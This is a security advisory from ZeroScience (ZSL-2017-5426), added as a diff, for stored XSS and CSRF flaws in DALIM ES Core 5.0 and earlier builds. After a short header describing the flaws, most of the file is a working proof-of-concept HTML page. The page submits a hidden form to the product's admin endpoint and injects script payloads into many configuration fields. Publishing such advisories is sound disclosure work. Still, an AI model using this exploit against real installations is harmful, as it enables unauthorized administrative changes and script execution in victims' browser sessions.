@@ -1,0 +1,213 @@
+<!--
+
+
+DALIM SOFTWARE ES Core 5.0 build 7184.1 Multiple Stored XSS And CSRF Vulnerabilities
+
+
+Vendor: Dalim Software GmbH
+Product web page: https://www.dalim.com
+Affected version: ES/ESPRiT 5.0 (build 7184.1)
+                                (build 7163.2)
+                                (build 7163.0)
+                                (build 7135.0)
+                                (build 7114.1)
+                                (build 7114.0)
+                                (build 7093.1)
+                                (build 7093.0)
+                                (build 7072.0)
+                                (build 7051.3)
+                                (build 7051.1)
+                                (build 7030.0)
+                                (build 7009.0)
+                                (build 6347.0)
+                                (build 6326.0)
+                                (build 6305.1)
+                                (build 6235.9)
+                                (build 6172.1)
+                  ES/ESPRiT 4.5 (build 6326.0)
+                                (build 6144.2)
+                                (build 5180.2)
+                                (build 5096.0)
+                                (build 4314.3)
+                                (build 4314.0)
+                                (build 4146.4)
+                                (build 3308.3)
+                  ES/ESPRiT 4.0 (build 4202.0)
+                                (build 4132.1)
+                                (build 2235.0)
+                  ES/ESPRiT 3.0
+
+Summary: ES is the new Enterprise Solution from DALIM SOFTWARE built
+from the successful TWIST, DIALOGUE and MISTRAL product lines. The ES
+Core is the engine that can handle project tracking, JDF device workflow,
+dynamic user interface building, volume management. Each ES installation
+will have different features, depending on the license installed: online
+approval, prepress workflow, project tracking, imposition management...
+
+ES is a collaborative digital asset production and management platform,
+offering services ranging from online approval to web-based production
+environment for all participants of the production cycle, including brand
+owners, agencies, publishers, pre-media, printers and multichannel service
+provider. ES lets users plan, execute and control any aspect of media
+production, regardless of the final use of the output (print, web, ebook,
+movie, and others). It ensures productivity and longterm profitability.
+
+Desc: The application allows users to perform certain actions via HTTP
+requests without performing any validity checks to verify the requests.
+This can be exploited to perform certain actions with administrative
+privileges if a logged-in user visits a malicious web site. XSS issues
+were also discovered. The issue is triggered when an unauthorized input
+passed via multiple POST and GET parameters are not properly sanitized
+before being returned to the user. This can be exploited to execute
+arbitrary HTML and script code in a user's browser session in context
+of an affected site.
+
+Tested on: Red Hat Enterprise Linux Server release 7.3 (Maipo)
+           CentOS 7
+           Apache Tomcat/7.0.78
+           Apache Tomcat/7.0.67
+           Apache Tomcat/7.0.42
+           Apache Tomcat/6.0.35
+           Apache-Coyote/1.1
+           Java/1.7.0_80
+           Java/1.6.0_21
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2017-5426
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5426.php
+
+
+15.06.2017
+
+-->
+
+
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://TARGET:8080/dalimws/admin" method="POST">
+      <input type="hidden" name="Prop/DeviceName" value="TESTHOST</script><script>alert(1)</script>" />
+      <input type="hidden" name="Prop_DeviceName_edit" value="TESTHOST" />
+      <input type="hidden" name="Prop/DeviceID" value="WebService-2510717331</script><script>alert(2)</script>" />
+      <input type="hidden" name="Prop_DeviceID_edit" value="WebService-2510717331" />
+      <input type="hidden" name="Prop/QueueCapacity" value="-1</script>script>alert(3)</script>" />
+      <input type="hidden" name="Prop_QueueCapacity_edit" value="-1" />
+      <input type="hidden" name="Prop/AbortOnNothingDone" value="false" />
+      <input type="hidden" name="Prop/IgnoreNodeInfo" value="false" />
+      <input type="hidden" name="Prop/SecurityPassword" value="" />
+      <input type="hidden" name="Prop_SecurityPassword_edit" value="" />
+      <input type="hidden" name="Prop/QueueFolderPath" value="/symlnks/io/jobs/JDFDevice/queue</script><script>alert(4)</script>" />
+      <input type="hidden" name="Prop_QueueFolderPath_edit" value="/symlnks/io/jobs/JDFDevice/queue" />
+      <input type="hidden" name="Prop/PluginFolderPath" value="/symlnks/DALiM_6.0/jdfplugins" />
+      <input type="hidden" name="Prop_PluginFolderPath_edit" value="/symlnks/DALiM_6.0/jdfplugins</script><script>alert(5)</script>" />
+      <input type="hidden" name="Prop/HotFolderPath" value="/symlnks/io/jobs/JDFDevice/hotfolder</script><script>alert(6)</script>" />
+      <input type="hidden" name="Prop_HotFolderPath_edit" value="/symlnks/io/jobs/JDFDevice/hotfolder" />
+      <input type="hidden" name="Prop/DestinationFolderPath" value="/symlnks/io/jobs/JDFDevice/output" />
+      <input type="hidden" name="Prop_DestinationFolderPath_edit" value="/symlnks/io/jobs/JDFDevice/output</script><script>alert(7)</script>" />
+      <input type="hidden" name="Prop/ControllerURL" value="http://TESTHOST:8080/dalimws/controller</script><script>alert(8)</script>" />
+      <input type="hidden" name="Prop_ControllerURL_edit" value="http://TESTHOST:8080/dalimws/controller" />
+      <input type="hidden" name="Prop_DBSettings_edit" value="" />
+      <input type="hidden" name="Prop/DBSettings" value="" />
+      <input type="hidden" name="Prop/JDBC_Driver" value="org.hsqldb.jdbcDriver</script><script>alert(9)</script>" />
+      <input type="hidden" name="Prop_JDBC_Driver_edit" value="org.hsqldb.jdbcDriver" />
+      <input type="hidden" name="Prop/JDBC_URL" value="jdbc:hsqldb:/symlnks/io/jobs/JDFDevice/queue/QueueDB" />
+      <input type="hidden" name="Prop_JDBC_URL_edit" value="jdbc:hsqldb:/symlnks/io/jobs/JDFDevice/queue/QueueDB" />
+      <input type="hidden" name="Prop/JDBC_User" value="SA" />
+      <input type="hidden" name="Prop_JDBC_User_edit" value="SA" />
+      <input type="hidden" name="Prop/JDBC_Password" value="null" />
+      <input type="hidden" name="Prop_JDBC_Password_edit" value="null" />
+      <input type="hidden" name="Prop_LogLevel_edit" value="Information" />
+      <input type="hidden" name="Prop/LogLevel" value="INFO" />
+      <input type="hidden" name="Prop_LogFiles_edit" value="stdout.log" />
+      <input type="hidden" name="Prop/LogFiles" value="stdout.log" />
+      <input type="hidden" name="Prop/LogContent" value="" />
+      <input type="hidden" name="Prop_LogContent_edit" value="" />
+      <input type="hidden" name="com/dalim/esprit/devices/imageserverpreview/ImageServerPreview/CacheSize" value="1000" />
+      <input type="hidden" name="com_dalim_esprit_devices_imageserverpreview_ImageServerPreview_CacheSize_edit" value="1000" />
+      <input type="hidden" name="com/dalim/esprit/devices/imageserverpreview/ImageServerPreview/CacheFolder" value="/symlnks/io/jobs/dialogue/cache" />
+      <input type="hidden" name="com_dalim_esprit_devices_imageserverpreview_ImageServerPreview_CacheFolder_edit" value="/symlnks/io/jobs/dialogue/cache" />
+      <input type="hidden" name="com_dalim_esprit_devices_imageserverpreview_ImageServerPreview_TextExtractionVersion_edit" value="2" />
+      <input type="hidden" name="com/dalim/esprit/devices/imageserverpreview/ImageServerPreview/TextExtractionVersion" value="2" />
+      <input type="hidden" name="com/dalim/jdf/process/plugin/twist/TwistPlugin/TwistGate" value="TWIST7-1" />
+      <input type="hidden" name="com_dalim_jdf_process_plugin_twist_TwistPlugin_TwistGate_edit" value="TWIST7-1" />
+      <input type="hidden" name="com/dalim/jdf/process/plugin/twist/TwistPlugin/GatePort" value="6042" />
+      <input type="hidden" name="com_dalim_jdf_process_plugin_twist_TwistPlugin_GatePort_edit" value="6042" />
+      <input type="hidden" name="com/dalim/jdf/process/plugin/twist/TwistPlugin/DirectFileIO" value="false" />
+      <input type="hidden" name="com/dalim/esprit/devices/ddms/cylindermontage/CylinderMontageProcess/fontRegistrationURL" value="" />
+      <input type="hidden" name="com_dalim_esprit_devices_ddms_cylindermontage_CylinderMontageProcess_fontRegistrationURL_edit" value="" />
+      <input type="hidden" name="com/dalim/esprit/devices/ddms/cylindermontage/CylinderMontageProcess/jdfProviderURL" value="" />
+      <input type="hidden" name="com_dalim_esprit_devices_ddms_cylindermontage_CylinderMontageProcess_jdfProviderURL_edit" value="" />
+      <input type="hidden" name="com/dalim/esprit/devices/ddms/cylindermontage/CylinderMontageProcess/layoutFolder" value="false" />
+      <input type="hidden" name="com_dalim_esprit_devices_ddms_cylindermontage_CylinderMontageProcess_layoutFolder_edit" value="false" />
+      <input type="hidden" name="com/dalim/esprit/devices/ddms/cylindermontage/CylinderMontageProcess/markFolder" value="" />
+      <input type="hidden" name="com_dalim_esprit_devices_ddms_cylindermontage_CylinderMontageProcess_markFolder_edit" value="" />
+      <input type="hidden" name="com/dalim/esprit/devices/ddms/cylindermontage/CylinderMontageProcess/markTmp" value="" />
+      <input type="hidden" name="com_dalim_esprit_devices_ddms_cylindermontage_CylinderMontageProcess_markTmp_edit" value="" />
+      <input type="hidden" name="com/dalim/devices/archiverestore/ArchivePlugin/P5Server" value="127.0.0.1" />
+      <input type="hidden" name="com_dalim_devices_archiverestore_ArchivePlugin_P5Server_edit" value="127.0.0.1" />
+      <input type="hidden" name="com/dalim/devices/archiverestore/ArchivePlugin/P5ServerPort" value="8000" />
+      <input type="hidden" name="com_dalim_devices_archiverestore_ArchivePlugin_P5ServerPort_edit" value="8000" />
+      <input type="hidden" name="com/dalim/devices/archiverestore/ArchivePlugin/P5User" value="super" />
+      <input type="hidden" name="com_dalim_devices_archiverestore_ArchivePlugin_P5User_edit" value="super" />
+      <input type="hidden" name="com/dalim/devices/archiverestore/ArchivePlugin/P5Password" value="super" />
+      <input type="hidden" name="com_dalim_devices_archiverestore_ArchivePlugin_P5Password_edit" value="super" />
+      <input type="hidden" name="com/dalim/devices/archiverestore/ArchivePlugin/P5Client" value="" />
+      <input type="hidden" name="com_dalim_devices_archiverestore_ArchivePlugin_P5Client_edit" value="" />
+      <input type="hidden" name="com/dalim/jdf/process/plugin/fileinput/FileInputPlugin/HotfolderLogging" value="false" />
+      <input type="hidden" name="com/dalim/jdf/process/plugin/fileinput/FileInputPlugin/FtpPort" value="" />
+      <input type="hidden" name="com_dalim_jdf_process_plugin_fileinput_FileInputPlugin_FtpPort_edit" value="" />
+      <input type="hidden" name="com/dalim/jdf/process/plugin/fileinput/FileInputPlugin/FtpDataRoot" value="/symlnks/io/jobs/ftpd/data" />
+      <input type="hidden" name="com_dalim_jdf_process_plugin_fileinput_FileInputPlugin_FtpDataRoot_edit" value="/symlnks/io/jobs/ftpd/data" />
+      <input type="hidden" name="com/dalim/jdf/process/plugin/fileinput/FileInputPlugin/FtpwatcherRoot" value="/symlnks/io/jobs/ftpwatcher" />
+      <input type="hidden" name="com_dalim_jdf_process_plugin_fileinput_FileInputPlugin_FtpwatcherRoot_edit" value="/symlnks/io/jobs/ftpwatcher" />
+      <input type="hidden" name="com/dalim/jdf/process/plugin/fileinput/FileInputPlugin/FtpwatcherLogging" value="false" />
+      <input type="hidden" name="com/dalim/jdf/process/plugin/fileinput/FileInputPlugin/MailwatcherRoot" value="/symlnks/io/jobs/mailwatcher" />
+      <input type="hidden" name="com_dalim_jdf_process_plugin_fileinput_FileInputPlugin_MailwatcherRoot_edit" value="/symlnks/io/jobs/mailwatcher" />
+      <input type="hidden" name="com/dalim/jdf/process/plugin/fileinput/FileInputPlugin/FilemonitorRoot" value="" />
+      <input type="hidden" name="com_dalim_jdf_process_plugin_fileinput_FileInputPlugin_FilemonitorRoot_edit" value="" />
+      <input type="hidden" name="com/dalim/jdf/process/plugin/fileinput/FileInputPlugin/FilemonitorBatchCount" value="1" />
+      <input type="hidden" name="com_dalim_jdf_process_plugin_fileinput_FileInputPlugin_FilemonitorBatchCount_edit" value="1" />
+      <input type="hidden" name="com_dalim_jdf_process_plugin_fileinput_FileInputPlugin_MetadataType_edit" value="DETAILED" />
+      <input type="hidden" name="com/dalim/jdf/process/plugin/fileinput/FileInputPlugin/MetadataType" value="DETAILED" />
+      <input type="hidden" name="com_dalim_jdf_process_plugin_fileinput_FileInputPlugin_DatabaseType_edit" value="hsqldb" />
+      <input type="hidden" name="com/dalim/jdf/process/plugin/fileinput/FileInputPlugin/DatabaseType" value="hsqldb" />
+      <input type="hidden" name="com/dalim/jdf/process/plugin/csconv/ColorSpaceConversionPlugin/BaseFolder" value="" />
+      <input type="hidden" name="com_dalim_jdf_process_plugin_csconv_ColorSpaceConversionPlugin_BaseFolder_edit" value="" />
+      <input type="hidden" name="com/dalim/jdf/process/plugin/csconv/ColorSpaceConversionPlugin/CheckInterval" value="-1" />
+      <input type="hidden" name="com_dalim_jdf_process_plugin_csconv_ColorSpaceConversionPlugin_CheckInterval_edit" value="-1" />
+      <input type="hidden" name="com/dalim/jdf/plugin/etwist/server/ETwistServerPlugin/LogfileMaxSize" value="100M" />
+      <input type="hidden" name="com_dalim_jdf_plugin_etwist_server_ETwistServerPlugin_LogfileMaxSize_edit" value="100M" />
+      <input type="hidden" name="com/dalim/jdf/plugin/etwist/server/ETwistServerPlugin/LogfileMaxCount" value="10" />
+      <input type="hidden" name="com_dalim_jdf_plugin_etwist_server_ETwistServerPlugin_LogfileMaxCount_edit" value="10" />
+      <input type="hidden" name="com/dalim/jdf/plugin/etwist/server/ETwistServerPlugin/LogAddHD" value="false" />
+      <input type="hidden" name="com/dalim/jdf/plugin/etwist/server/ETwistServerPlugin/LogIntoTomcatLog" value="false" />
+      <input type="hidden" name="com_dalim_jdf_plugin_etwist_server_ETwistServerPlugin_LoggingLevel_edit" value="INFO" />
+      <input type="hidden" name="com/dalim/jdf/plugin/etwist/server/ETwistServerPlugin/LoggingLevel" value="INFO" />
+      <input type="hidden" name="com/dalim/jdf/plugin/etwist/server/ETwistServerPlugin/ExtraServerLogging" value="false" />
+      <input type="hidden" name="com/dalim/jdf/plugin/etwist/server/ETwistServerPlugin/ServerPort" value="6019" />
+      <input type="hidden" name="com_dalim_jdf_plugin_etwist_server_ETwistServerPlugin_ServerPort_edit" value="6019" />
+      <input type="hidden" name="com_dalim_jdf_plugin_etwist_server_ETwistServerPlugin_PublishWorkflows_edit" value="on" />
+      <input type="hidden" name="com/dalim/jdf/plugin/etwist/server/ETwistServerPlugin/PublishWorkflows" value="true" />
+      <input type="hidden" name="com_dalim_jdf_plugin_etwist_server_ETwistServerPlugin_RetLogLocation_edit" value="JDFResult" />
+      <input type="hidden" name="com/dalim/jdf/plugin/etwist/server/ETwistServerPlugin/RetLogLocation" value="JDFResult" />
+      <input type="hidden" name="com_dalim_jdf_plugin_etwist_server_ETwistServerPlugin_LogAlways_edit" value="on" />
+      <input type="hidden" name="com/dalim/jdf/plugin/etwist/server/ETwistServerPlugin/LogAlways" value="true" />
+      <input type="hidden" name="com/dalim/jdf/plugin/etwist/server/ETwistServerPlugin/MaxProcessCount" value="16" />
+      <input type="hidden" name="com_dalim_jdf_plugin_etwist_server_ETwistServerPlugin_MaxProcessCount_edit" value="16" />
+      <input type="hidden" name="com/dalim/jdf/plugin/etwist/server/ETwistServerPlugin/MaxRunningProcessCount" value="16" />
+      <input type="hidden" name="com_dalim_jdf_plugin_etwist_server_ETwistServerPlugin_MaxRunningProcessCount_edit" value="16" />
+      <input type="hidden" name="com/dalim/jdf/plugin/etwist/server/ETwistServerPlugin/HardworkerCount" value="2" />
+      <input type="hidden" name="com_dalim_jdf_plugin_etwist_server_ETwistServerPlugin_HardworkerCount_edit" value="2" />
+      <input type="hidden" name="com/dalim/jdf/plugin/etwist/server/ETwistServerPlugin/RepositoryUrl" value="http://localhost:8080/EspritEngine/JMFProcessor.html/servlet/etwistrepository" />
+      <input type="hidden" name="com_dalim_jdf_plugin_etwist_server_ETwistServerPlugin_RepositoryUrl_edit" value="http://localhost:8080/EspritEngine/JMFProcessor.html/servlet/etwistrepository" />
+      <input type="hidden" name="Prop/queueIsRunning" value="false" />
+      <input type="hidden" name="Prop/action" value="return" />
+      <input type="hidden" name="XUI_SessionID" value="admin976" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
